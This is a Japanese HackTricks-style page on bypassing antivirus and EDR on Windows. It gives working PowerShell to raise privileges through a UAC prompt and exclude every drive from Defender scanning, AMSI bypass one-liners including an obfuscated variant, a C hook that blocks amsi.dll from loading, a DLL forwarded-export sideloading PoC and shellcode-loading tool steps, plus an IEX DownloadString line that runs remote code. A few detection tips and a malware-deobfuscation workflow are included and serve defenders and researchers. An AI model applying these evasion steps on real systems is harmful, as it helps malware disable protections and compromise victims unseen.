# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは当初、** [**@m2rc_p**](https://twitter.com/m2rc_p)** によって執筆されました！**

## Defenderを停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するtool。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止するtool。
- [管理者の場合はDefenderを無効化](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前のInstaller-style UAC bait

ゲームcheatを装ったPublic loaderは、署名されていないNode.js/Nexe installerとして配布されることが多く、最初に **ユーザーに昇格を求め**、その後でDefenderを無力化します。流れは単純です。

1. `net session`を使用して管理者コンテキストを確認します。このcommandは呼び出し元がadmin権限を持っている場合にのみ成功するため、失敗した場合はloaderがstandard userとして実行されていることを示します。
2. 元のcommand lineを維持したまま、`RunAs` verbを使用して自身を直ちに再起動し、想定されるUAC同意promptを表示します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」ソフトウェアをインストールしていると信じているため、通常このプロンプトを受け入れ、malware に Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する包括的な `MpPreference` 除外

権限を昇格すると、GachiLoader-style の chain はサービスを完全に無効化するのではなく、Defender の死角を最大限に広げます。まず loader は GUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を kill し、続いて**極めて広範な除外**を設定します。これにより、すべての user profile、system directory、removable disk がスキャン不能になります：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察結果：

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこに配置された payload も無視される**。
- `.sys` 拡張子の除外は将来を見据えたものであり、攻撃者は後から Defender に再度触れることなく、unsigned driver をロードする選択肢を確保できる。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に反映されるため、後続ステージで除外設定が維持されていることを確認したり、UAC を再度トリガーせずに除外範囲を拡大したりできる。

Defender サービス自体は停止されないため、単純な health check では「antivirus active」と報告され続ける一方、実際のリアルタイム検査はそれらのパスに一切触れなくなる。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AV はファイルが malicious かどうかを確認するために、static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis など、さまざまな方法を使用している。

### **Static detection**

Static detection は、binary や script 内の既知の malicious な文字列や byte 配列を検出し、さらにファイル自体から情報（ファイルの説明、会社名、digital signature、icon、checksum など）を抽出することで行われる。つまり、既知の public tool を使うと、すでに分析され malicious としてフラグが付けられている可能性があるため、より簡単に検知されることがある。この種の検知を回避する方法はいくつかある。

- **Encryption**

binary を encrypt すれば、AV がプログラムを検知する方法はなくなるが、プログラムを decrypt して memory 上で実行するための何らかの loader が必要になる。

- **Obfuscation**

binary や script 内の文字列をいくつか変更するだけで AV を通過できる場合もあるが、obfuscate しようとしている対象によっては時間のかかる作業になる。

- **Custom tooling**

独自の tool を開発すれば、既知の bad signature は存在しないが、多くの時間と労力が必要になる。

> [!TIP]
> Windows Defender の static detection に対して確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) が適している。これは基本的にファイルを複数のセグメントに分割し、それぞれを個別に Defender に scan させることで、binary 内のどの文字列や byte にフラグが付けられたのかを正確に確認できる。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を確認することを強く推奨する。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox 内で binary を実行し、malicious な活動（browser の password を decrypt して読み取ろうとする、LSASS に対して minidump を実行するなど）を監視することである。この部分への対処は少し難しい場合があるが、sandbox を回避するためにできることをいくつか紹介する。

- **Sleep before execution** 実装方法によっては、AV の dynamic analysis を bypass する優れた方法になる。AV がファイルを scan できる時間は、ユーザーの workflow を中断しないよう非常に短く設定されているため、長時間 sleep させると binary の analysis を妨害できる。ただし、多くの AV sandbox は、実装方法によっては sleep を単純に skip できるという問題がある。
- **Checking machine's resources** 通常、Sandbox が利用できる resource は非常に少ない（例：< 2GB RAM）。そうでなければユーザーの machine の動作を遅くしてしまうためである。ここでは非常に創造的な方法も使える。例えば CPU の温度や fan speed を確認するなど、すべてが sandbox 内で実装されているとは限らない。
- **Machine-specific checks** 「contoso.local」domain に参加している workstation のユーザーを target にしたい場合、computer の domain を確認し、指定したものと一致するかを検証できる。一致しなければ、プログラムを exit させることができる。

Microsoft Defender の Sandbox computername は HAL9TH であることが判明している。そのため、detonation 前に malware 内で computer name を確認し、名前が HAL9TH と一致すれば Defender の sandbox 内にいることを意味するため、プログラムを exit させることができる。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の優れた tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この post で前述したように、**public tools** は最終的に**検知される**ため、次のことを自問すべきである。

例えば、LSASS を dump したい場合、**本当に mimikatz を使う必要があるのか**。それとも、知名度が低く、同じく LSASS を dump できる別の project を使えるのか。

おそらく正しい答えは後者である。mimikatz を例にすると、これはおそらく AV や EDR によって最も多く flag されている malware の一つであり、最も多く flag されているものと言ってもよい。project 自体は非常に優れているが、AV を回避するための扱いは悪夢のように難しい。そのため、達成したい目的に対する alternative を探すべきである。

> [!TIP]
> evasion のために payload を変更する場合は、Defender の **automatic sample submission を無効にする**こと。そして、長期的に evasion を達成することが目的なら、**決して VIRUSTOTAL に UPLOAD しないこと**。特定の AV によって payload が検知されるか確認したい場合は、VM にその AV を install し、automatic sample submission を無効にしてから、結果に納得できるまでそこで test すること。

## EXEs vs DLLs

可能な場合は常に、**evasion では DLL の使用を優先する**こと。私の経験では、DLL file は通常、**検知・分析される可能性がはるかに低い**ため、payload に DLL として実行する方法がある場合、一部のケースで detection を回避するための非常に簡単な trick になる。

この image から分かるように、Havoc の DLL Payload は antiscan.me で 4/26 の detection rate である一方、EXE payload の detection rate は 7/26 である。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me による比較</p></figcaption></figure>

ここからは、DLL file を使ってさらに stealthier にするための trick をいくつか紹介する。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と malicious payload(s) の両方を隣り合わせに配置し、loader が使用する DLL search order を利用する。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使用して、DLL Sideloading の影響を受けやすい program を確認できる。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、`"C:\Program Files\\"` 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらがロードしようとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable programs** は、ぜひ自分で**調査する**ことを強くお勧めします。この technique は適切に実行すればかなり stealthy ですが、公開されている DLL Sideloadable programs を使用すると、簡単に発見される可能性があります。

プログラムがロードしようとする名前の malicious DLL を配置するだけでは、payload はロードされません。これは、プログラムがその DLL 内に特定の functions が存在することを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使用します。

**DLL Proxying** は、プログラムが proxy（および malicious）DLL に対して行う calls を original DLL に転送します。これにより、プログラムの functionality を維持しながら、payload の execution を処理できます。

ここでは、[@flangvik](https://twitter.com/Flangvik) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した手順です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドにより、2つのファイルが生成されます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
結果は以下のとおりです。

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[S3N](https://github.com/EgeBalci/sgn) でエンコードした shellcode と proxy DLL の両方が、[antiscan.me](https://antiscan.me) で 0/26 Detection rate でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading についての [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と、さらに詳しく学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を**強くおすすめします**。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- `TargetDll` がまだロードされていない場合はロードする
- そこから `TargetFunc` を解決する

理解しておくべき主な動作:
- `TargetDll` が KnownDLL の場合、保護された KnownDLLs namespace（例: ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll` が KnownDLL でない場合は、通常の DLL search order が使用されます。これには forward resolution を実行している module の directory が含まれます。

これにより、間接的な sideloading primitive が可能になります。つまり、non-KnownDLL module name に forward された function を export している signed DLL を見つけ、その signed DLL を、forward された target module とまったく同じ名前の attacker-controlled DLL と同じ場所に配置します。forwarded export が呼び出されると、loader は forward を解決し、同じ directory からあなたの DLL をロードして DllMain を実行します。<sup>[[13]](#references)</sup>

Windows 11 で確認された例:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 悪意のある `NCRYPTPROV.dll` を同じフォルダに配置します。最小限の DllMain だけで code execution を実行するには十分であり、DllMain をトリガーするために転送関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名付きLOLBinでフォワードをトリガーする：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` の解決中に、loader が `NCRYPTPROV.SetAuditingInterface` への forward に従う
- その後 loader が `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` がすでに実行された後にのみ "missing API" エラーが発生する

Hunting tips:
- target module が KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧表示されている。
- 次のような tooling を使用して forwarded exports を列挙できる：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense ideas:
- LOLBins（例: `rundll32.exe`）が非システムパスから署名済み DLL をロードし、その後、そのディレクトリから同じベース名を持つ KnownDLLs 以外の DLL をロードする動作を監視する
- `rundll32.exe` → 非システムの `keyiso.dll` → ユーザーが書き込み可能なパス配下の `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンを検知する
- code integrity policies（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使用すると、shellcode をステルス性の高い方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion は単なるいたちごっこです。今日有効なものが明日検出される可能性があるため、1つのツールだけに依存せず、可能であれば複数の Evasion technique を連鎖させてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR は、`ntdll.dll` の syscall stub に **user-mode inline hooks** を配置することがよくあります。これらの hooks を bypass するには、正しい **SSN**（System Service Number）をロードし、hook された export entrypoint を実行せずに kernel mode へ遷移する **direct** または **indirect syscall stub** を生成できます。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 生成された stub に `syscall`/`sysenter`/`SVC #0` 命令を埋め込みます（`ntdll` export を経由しません）。
- **Indirect**: `ntdll` 内にある既存の `syscall` gadget へ jump し、kernel への遷移が `ntdll` から発生したように見せます（heuristic evasion に有用）。**randomized indirect** では、呼び出しごとに gadget pool から gadget を選択します。
- **Egg-hunt**: static な `0F 05` opcode sequence を disk 上に埋め込むことを避け、runtime に syscall sequence を解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes を読み取る代わりに、syscall stub を virtual address 順に sort して SSN を推測します。
- **SyscallsFromDisk**: clean な `\KnownDlls\ntdll.dll` を map し、その `.text` から SSN を読み取ってから unmap します（メモリ上のすべての hooks を bypass します）。
- **RecycledGate**: VA-sorted SSN inference と、stub が clean な場合の opcode validation を組み合わせます。hook されている場合は VA inference に fallback します。
- **HW Breakpoint**: `syscall` 命令に DR0 を設定し、VEH を使用して runtime に `EAX` から SSN を取得します。hook された bytes の parsing は不要です。

SysWhispers4 の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。当初、AVは**ディスク上のファイル**のみをスキャンできたため、何らかの方法でpayloadを**メモリ上で直接**実行できれば、AVにはそれを防ぐ手段がありませんでした。十分な可視性がなかったためです。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、またはActiveXのインストールの昇格）
- PowerShell（scripts、対話的な使用、および動的なcode評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBA macros

これにより、antivirus solutionsは、scriptの内容を暗号化もobfuscationもされていない形式で公開することで、scriptの挙動を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで以下のalertが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続けて、scriptを実行したexecutableのpathが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルを一切書き込みませんでしたが、それでもAMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C# codeもAMSIを通過して実行されます。これは、メモリ上で実行するための`Assembly.Load(byte[])`によるloadにも影響します。そのため、AMSIを回避してメモリ上で実行したい場合は、より低いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主にstatic detectionsで動作するため、loadしようとするscriptsを変更することは、検知を回避する良い方法になり得ます。

ただし、AMSIには、複数のlayerがあってもscriptsをunobfuscateする機能があるため、実施方法によってはobfuscationが悪い選択肢になる可能性があります。このため、回避はそれほど単純ではありません。とはいえ、場合によっては、variable namesをいくつか変更するだけで十分なこともあるため、どの程度flagが立てられているかによって異なります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなども含む）processにloadすることで実装されているため、unprivileged userとして実行していても容易にtamperできます。AMSIの実装におけるこの欠陥により、researchersはAMSI scanningを回避する複数の方法を発見しました。

**Forcing an Error**

AMSIのinitializationを強制的に失敗させる（amsiInitFailed）と、現在のprocessに対するscanは開始されません。当初これは[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な利用を防ぐためのsignatureを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするのに必要だったのは、powershell コード1行だけでした。もちろん、この行自体は AMSI によって検知されるため、この technique を使用するには何らかの変更が必要です。

以下は、こちらの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した、変更済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
この投稿が公開されると、おそらくフラグが立てられることに注意してください。そのため、検知されないことが目的なら、コードを公開すべきではありません。

**Memory Patching**

この technique は、最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。これは、ユーザーが提供した入力のスキャンを担う amsi.dll 内の「AmsiScanBuffer」function のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きするものです。これにより、実際のスキャン結果は 0 を返し、clean な結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を参照してください。

AMSI を powershell で bypass するために使用される technique は、ほかにも多数あります。詳細については、[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**この repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll のロードを防止して AMSI をブロックする（LdrLoadDll hook）

AMSI は、`amsi.dll` が現在の process にロードされた後にのみ初期化されます。堅牢で language-agnostic な bypass 方法は、`ntdll!LdrLoadDll` に user-mode hook を配置し、要求された module が `amsi.dll` の場合に error を返すことです。その結果、AMSI はロードされず、その process ではスキャンが実行されません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、custom loader のいずれでも機能します（AMSI をロードするものすべてが対象です）。
- stdin 経由でスクリプトを渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長いコマンドラインの痕跡を避けられます。
- LOLBins を介して実行される loader で使用される例が確認されています（例：`regsvr32` が `DllRegisterServer` を呼び出す場合）。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** という tool も、AMSI を bypass する script を生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** という tool も、user-defined function、variables、characters expression をランダム化し、さらに PowerShell keywords の文字 casing をランダムに適用することで signature を回避する、AMSI を bypass する script を生成します。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などの tool を使用して、現在の process の memory から検出された AMSI signature を削除できます。この tool は、現在の process の memory をスキャンして AMSI signature を探し、NOP instructions で上書きすることで、memory から効果的に削除します。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使用すると AMSI はロードされないため、AMSI にスキャンされずに script を実行できます。次のように実行できます。
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題**になる可能性もあります。

PowerShell logging を bypass するには、以下の technique を使用できます。

- **PowerShell Transcription と Module Logging を無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のような tool を使用できます。
- **Powershell version 2 を使用する**: PowerShell version 2 を使用すると AMSI がロードされないため、AMSI に scan されずに script を実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell session を使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用すると、`powershell.exe` を起動せずに PowerShell を host できます（Cobalt Strike の `powerpick` で使用されている approach）。これにより、`powershell.exe` process に特化した controls は bypass できますが、AMSI、Script Block Logging、その他すべての PowerShell defense が本質的に無効になるわけではありません。coverage は runtime と host implementation に依存します。


## Obfuscation

> [!TIP]
> 複数の obfuscation technique は data の encrypting に依存しているため、binary の entropy が増加し、AV や EDR による検出が容易になります。この点に注意し、暗号化は code のうち、sensitive または hidden にする必要がある特定の section にのみ適用することを検討してください。

### ConfuserEx-Protected .NET Binary の Deobfuscating

ConfuserEx 2（または commercial fork）を使用する malware を分析する際は、decompiler や sandbox を妨害する複数の protection layer に遭遇することが一般的です。以下の workflow により、**ほぼ original の IL を確実に復元**でき、その後 dnSpy や ILSpy などの tool で C# に decompile できます。<sup>[[10]](#references)</sup>

1.  Anti-tampering の除去 – ConfuserEx はすべての *method body* を encrypt し、*module* static constructor（`<Module>.cctor`）内で decrypt します。さらに PE checksum に patch を適用するため、変更を加えると binary が crash します。**AntiTamperKiller** を使用して encrypted metadata table を特定し、XOR key を復元して、clean assembly を書き換えます:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output には 6 つの anti-tamper parameter（`key0-key3`、`nameHash`、`internKey`）が含まれます。これらは独自の unpacker を構築する際に役立ちます。

2.  Symbol / control-flow の復元 – *clean* file を **de4dot-cex**（ConfuserEx に対応した de4dot の fork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile を選択
• de4dot は control-flow flattening を元に戻し、original の namespace、class、variable name を復元して、constant string を decrypt します。

3.  Proxy-call の除去 – ConfuserEx は decompilation をさらに妨害するため、direct method call を軽量な wrapper（*proxy call* とも呼ばれる）に置き換えます。**ProxyCall-Remover** を使用して除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この step の後には、不透明な wrapper function（`Class8.smethod_10`、…）ではなく、`Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が確認できるはずです。

4.  Manual clean-up – 生成された binary を dnSpy で実行し、large Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*real* payload の位置を特定します。malware は、`<Module>.byte_0` 内で初期化される TLV-encoded byte array として payload を保存していることがよくあります。

上記の chain により、malicious sample を実行せずに execution flow を復元できます。これは offline workstation で作業する際に役立ちます。

> 🛈  ConfuserEx は `ConfusedByAttribute` という custom attribute を生成します。これは sample を自動的に triage するための IOC として使用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアセキュリティを向上できる、[LLVM](http://www.llvm.org/) compilation suiteのオープンソース fork を提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用したり compiler を変更したりせずに、`C++11/14` languageを使用して compile 時に obfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成された obfuscated operationsの layer を追加し、applicationを crack しようとする人の作業を少し困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまな pe filesを obfuscate できる x64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の executablesに対応するシンプルな metamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を使用する LLVM-supported languages向けの fine-grained code obfuscation frameworkです。ROPfuscatorは、通常の instructionsを ROP chainsに変換することで assembly code level で programを obfuscateし、通常の control flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは Nimで記述された .NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存の EXE/DLLを shellcodeに変換してから load できます。

## SmartScreen & MoTW

インターネットから executablesを downloadして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のある applicationsの実行から end userを保護するための security mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主に reputation-based approachで動作します。つまり、一般的でない applicationsを downloadすると SmartScreenが起動し、end userに alertを表示して fileの実行を防止します（ただし、More Info -> Run anywayをクリックすれば fileを実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)で、インターネットから fileを downloadすると、download元の URLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットから downloadした fileの Zone.Identifier ADSを確認しています。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名された executablesは、**SmartScreenを起動しない**ことに注意してください。

payloadに Mark of The Webが付与されるのを防ぐ非常に効果的な方法は、payloadを ISOなどの containerにパッケージ化することです。これは、Mark-of-the-Web (MOTW)を **non NTFS** volumesに適用することが**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するために payloadを output containersへパッケージ化する toolです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
